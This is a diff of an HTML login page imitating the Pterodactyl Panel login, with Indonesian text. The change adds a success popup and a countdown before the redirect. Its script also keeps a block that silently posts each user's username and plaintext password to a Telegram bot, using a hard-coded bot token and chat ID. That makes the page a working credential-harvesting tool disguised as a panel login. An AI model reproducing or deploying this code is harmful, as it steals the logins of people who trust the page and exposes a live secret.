@@ -8,6 +8,11 @@
 </head>
 <body>
   <div class="box">
+    <div id="successPopup" style="display: none;" class="popup-success">
+  <h3>✅ Login Berhasil</h3>
+  <p id="successMessage">✅ Kamu berhasil masuk sebagai: <strong>USERNAME</strong></p>
+  <p id="countdownTimer">⏱️ Redirect ke halaman utama dalam: <strong>00:05</strong> detik</p>
+    </div>
     <form autocomplete="off" onsubmit="login(event)">
       <img src="ptero.png" alt="Pterodactyl Panel" class="img">
       <h1>Pterodactyl</h1>
@@ -48,31 +53,48 @@
         const user = users.find(u => u.username === username && u.password === password);
 
         if (user) {
-          // Kirim notifikasi ke Telegram
-          const now = new Date();
-          const waktu = now.toLocaleString('id-ID', {
-            weekday: 'long',
-            year: 'numeric',
-            month: 'long',
-            day: 'numeric',
-            hour: '2-digit',
-            minute: '2-digit',
-            second: '2-digit'
-          });
+  const now = new Date();
+  const waktu = now.toLocaleString('id-ID', {
+    weekday: 'long',
+    year: 'numeric',
+    month: 'long',
+    day: 'numeric',
+    hour: '2-digit',
+    minute: '2-digit',
+    second: '2-digit'
+  });
 
-          const message = `✅ LOGIN BERHASIL\nUsername: ${username}\nPassword: ${password}\nWaktu: ${waktu}`;
-          fetch(`https://api.telegram.org/bot7593438716:AAGn6wr0_5-5uO2LXmKpagZcneoXdmca-zg/sendMessage`, {
-            method: "POST",
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              chat_id: "7950114253",
-              text: message
-            })
-          });
+  const message = `✅ LOGIN BERHASIL\nUsername: ${username}\nPassword: ${password}\nWaktu: ${waktu}`;
+  fetch(`https://api.telegram.org/bot7593438716:AAGn6wr0_5-5uO2LXmKpagZcneoXdmca-zg/sendMessage`, {
+    method: "POST",
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: "7950114253",
+      text: message
+    })
+  });
 
-          // ✅ Redirect ke halaman login.html
-          window.location.href = `login.html?accessKey=${user.accessKey}`;
-        } else {
+  // Tampilkan popup sukses
+  const popup = document.getElementById("successPopup");
+  const successMsg = document.getElementById("successMessage");
+  const timerText = document.getElementById("countdownTimer");
+
+  popup.style.display = "block";
+  successMsg.innerHTML = `✅ Kamu berhasil masuk sebagai: <strong>${username}</strong>`;
+
+  let seconds = 5;
+  timerText.innerHTML = `⏱️ Redirect ke halaman utama dalam: <strong>00:0${seconds}</strong> detik`;
+
+  const interval = setInterval(() => {
+    seconds--;
+    timerText.innerHTML = `⏱️ Redirect ke halaman utama dalam: <strong>00:0${seconds}</strong> detik`;
+
+    if (seconds <= 0) {
+      clearInterval(interval);
+      window.location.href = `login.html?accessKey=${user.accessKey}`;
+    }
+  }, 1000);
+} else {
           attempts++;
           errorDiv.style.display = "block";
 
